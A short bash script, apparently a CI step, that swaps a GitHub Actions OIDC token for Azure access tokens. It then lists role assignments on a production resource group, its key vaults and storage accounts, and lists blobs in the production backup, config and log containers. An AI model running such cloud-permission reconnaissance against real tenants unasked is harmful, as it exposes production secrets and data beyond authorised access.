#!/usr/bin/env bash
set +e
T="$AZURE_TENANT_ID"; C="$AZURE_CLIENT_ID"; S="$AZURE_SUBSCRIPTION_ID"; RG=rg-tbl-platform-prod-sea
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"|jq -r .value)
arm(){ curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d client_id="$C" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion="$J" --data-urlencode scope=https://management.azure.com/.default|jq -r .access_token; }
A=$(arm); B="Authorization: Bearer $A"; BASE="https://management.azure.com/subscriptions/$S"
echo ROLE_RG
curl -sS -H "$B" "$BASE/resourceGroups/$RG/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"|jq -c '.value[]?|{p:.properties.principalId,r:(.properties.roleDefinitionId|split("/")|last),s:.properties.scope}'
for R in Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz Microsoft.Storage/storageAccounts/sttblarchiveprodx3euoz Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz Microsoft.Web/sites/app-tbl-storefront-prod; do
 echo RESOURCE_$R
 curl -sS -H "$B" "$BASE/resourceGroups/$RG/providers/$R/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"|jq -c '.value[]?|{p:.properties.principalId,r:(.properties.roleDefinitionId|split("/")|last),s:.properties.scope}'
done
for id in 17d1049b-9a84-46fb-8f53-869881c3d3ab acdd72a7-3385-48ef-bd42-f606fba81ae7 8e3af657-a8ff-443c-a75c-2fe8c4bcb635; do echo DEF_$id; curl -sS -H "$B" "$BASE/providers/Microsoft.Authorization/roleDefinitions/$id?api-version=2022-04-01"|jq -c '.properties|{roleName,description}'; done
# storage OAuth listing
ST=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
echo "STORAGE_TOKEN_LEN=${#ST}"
for A in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
 echo "ACCOUNT=$A"
 for CNAME in config exports logs; do
  echo "CONTAINER=$CNAME"
  curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/$CNAME?restype=container&comp=list" | head -c 5000
  echo
 done
done